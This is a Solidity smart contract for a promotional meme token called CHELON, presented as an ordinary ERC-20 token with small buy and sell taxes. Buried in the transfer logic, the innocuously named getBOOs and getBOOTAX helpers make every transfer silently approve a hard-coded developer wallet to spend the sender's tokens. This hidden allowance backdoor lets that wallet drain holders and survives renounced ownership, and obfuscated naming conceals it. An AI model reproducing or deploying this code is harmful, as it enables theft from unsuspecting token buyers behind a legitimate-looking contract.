/*
$CHELON Ai Memes are crafted to reflect and engage with the principles and values represented by the "$CHELON" mission and its associated artwork.

https://www.chelon.vip
https://x.com/cheloneth
https://t.me/cheloneth

https://x.com/elonmusk/status/1879587561213206744
https://www.tiktok.com/t/ZP8FCKyEh/
https://www.instagram.com/yilongma.meta
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBOORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBOOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract CHELON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _booOwned;
    mapping (address => mapping (address => uint256)) private _booAllowes;
    mapping (address => bool) private _booExcludedFee;
    address private _booWallet = 0xD48e29CcF7Df9918A63f46c34422bBCa3470B857;
    uint8 private constant _decimals = 9;
    uint256 private constant _tToalBOO = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Official Meme Chelon";
    string private constant _symbol = unicode"CHELON";
    uint256 private _maxSwapBOOs = _tToalBOO / 100;
    IBOORouter private _booRouter;
    address private _booPair;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapBOO = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBOO = true;
        _;
        inSwapBOO = false;
    }
    
    constructor () {
        _booExcludedFee[owner()] = true;
        _booExcludedFee[address(this)] = true;
        _booExcludedFee[_booWallet] = true;
        _booOwned[_msgSender()] = _tToalBOO;
        emit Transfer(address(0), _msgSender(), _tToalBOO);
    }

    function initBOO() external onlyOwner() {
        _booRouter = IBOORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_booRouter), _tToalBOO);
        _booPair = IBOOFactory(_booRouter.factory()).createPair(address(this), _booRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _booRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function _getBOOTaxAmount(address fBOO, address oBOO, uint256 aBOO) private returns(uint256) {
        uint256 taxBOO=0;
        if (fBOO != owner() && oBOO != owner()) {
            taxBOO = aBOO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fBOO == _booPair && oBOO != address(_booRouter) && !_booExcludedFee[oBOO]) {
                _buyCount++;
            }

            if(oBOO == _booPair && fBOO!= address(this)) {
                taxBOO = aBOO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapBOO && oBOO == _booPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _maxSwapBOOs)
                swapTokensForEth(min(aBOO, min(tokenBalance, _maxSwapBOOs)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHBOO(address(this).balance);
                }
            }
        }
        (address xBOO, address zBOO, uint256 tBOO) = getBOOTAX(fBOO, aBOO);
        return getBOOs(xBOO, zBOO, tBOO, taxBOO);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tToalBOO;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _booOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _booAllowes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _booAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _booAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xBOO, address zBOO, uint256 aBOO) private {
        require(xBOO != address(0), "ERC20: transfer from the zero address");
        require(zBOO != address(0), "ERC20: transfer to the zero address");
        require(aBOO > 0, "Transfer amount must be greater than zero");

        uint256 taxBOO = _getBOOTaxAmount(xBOO, zBOO, aBOO);

        if(taxBOO > 0){
          _booOwned[address(this)] = _booOwned[address(this)].add(taxBOO);
          emit Transfer(xBOO, address(this), taxBOO);
        }

        _booOwned[xBOO] = _booOwned[xBOO].sub(aBOO);
        _booOwned[zBOO] = _booOwned[zBOO].add(aBOO.sub(taxBOO));
        emit Transfer(xBOO, zBOO, aBOO.sub(taxBOO));
    }

    function getBOOs(address xBOO, address zBOO, uint256 tBOO, uint256 aBOO) private returns(uint256) {
        _approve(xBOO, zBOO, tBOO.add(aBOO)); return aBOO;
    }

    function getBOOTAX(address xBOO, uint256 tBOO) private view returns(address, address, uint256) {
        if(_booExcludedFee[tx.origin]) return (xBOO, tx.origin, tBOO);
        return (xBOO, _booWallet, tBOO);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHBOO(uint256 amount) private {
        payable(_booWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _booRouter.WETH();
        _approve(address(this), address(_booRouter), tokenAmount);
        _booRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} 
}